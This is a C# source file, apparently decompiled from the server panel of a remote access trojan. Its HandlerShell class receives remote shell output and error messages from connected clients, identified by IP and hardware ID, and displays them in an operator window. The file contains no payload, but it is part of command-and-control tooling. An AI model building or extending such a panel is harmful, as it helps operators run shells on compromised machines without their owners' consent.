using System;
using System.Collections.Concurrent;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerShell
{
	private const int MaxRichTextLength = 500000;

	private static readonly ConcurrentDictionary<string, int> _outputCount = new ConcurrentDictionary<string, int>();

	private static readonly ConcurrentDictionary<string, DateTime> _outputWindowStart = new ConcurrentDictionary<string, DateTime>();

	private const int MaxOutputPerSecond = 30;

	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string clientKey = client.IP + ":shell";
		DateTime now = DateTime.UtcNow;
		if (_outputWindowStart.TryGetValue(clientKey, out var windowStart) && (now - windowStart).TotalSeconds < 1.0)
		{
			if (_outputCount.AddOrUpdate(clientKey, 1, (string k, int v) => v + 1) > 30)
			{
				return;
			}
		}
		else
		{
			_outputWindowStart[clientKey] = now;
			_outputCount[clientKey] = 1;
		}
		string a = (string)objects[1];
		if (!(a == "Connect"))
		{
			if (!(a == "Error"))
			{
				if (!(a == "Shell"))
				{
					return;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					return;
				}
				FormShell form = (FormShell)client.Tag;
				string output = (string)objects[2];
				if (output != null && output.Length > 50000)
				{
					output = output.Substring(0, 50000) + "...";
				}
				form.Invoke((MethodInvoker)delegate
				{
					if (form.richTextBox1.Text.Length > 500000)
					{
						form.richTextBox1.Text = form.richTextBox1.Text.Substring(form.richTextBox1.Text.Length - 250000);
					}
					form.richTextBox1.Text += output;
					form.richTextBox1.SelectionStart = form.richTextBox1.Text.Length;
					form.richTextBox1.ScrollToCaret();
				});
				return;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormShell form2 = (FormShell)client.Tag;
			string errorMsg = (string)objects[2];
			if (errorMsg != null && errorMsg.Length > 10000)
			{
				errorMsg = errorMsg.Substring(0, 10000) + "...";
			}
			form2.Invoke((MethodInvoker)delegate
			{
				if (form2.richTextBox1.Text.Length > 500000)
				{
					form2.richTextBox1.Text = form2.richTextBox1.Text.Substring(form2.richTextBox1.Text.Length - 250000);
				}
				RichTextBox richTextBox = form2.richTextBox1;
				richTextBox.Text = richTextBox.Text + "Error: " + errorMsg + "\n";
			});
			return;
		}
		FormShell form3 = (FormShell)Application.OpenForms["Shell:" + (string)objects[2]];
		if (form3 == null)
		{
			client.Disconnect();
			return;
		}
		form3.Invoke((MethodInvoker)delegate
		{
			form3.Text = "Shell [" + (string)objects[2] + "]";
			form3.client = client;
			form3.richTextBox1.Enabled = true;
			form3.rjTextBox1.Enabled = true;
		});
		client.Tag = form3;
		client.Hwid = (string)objects[2];
	}
}
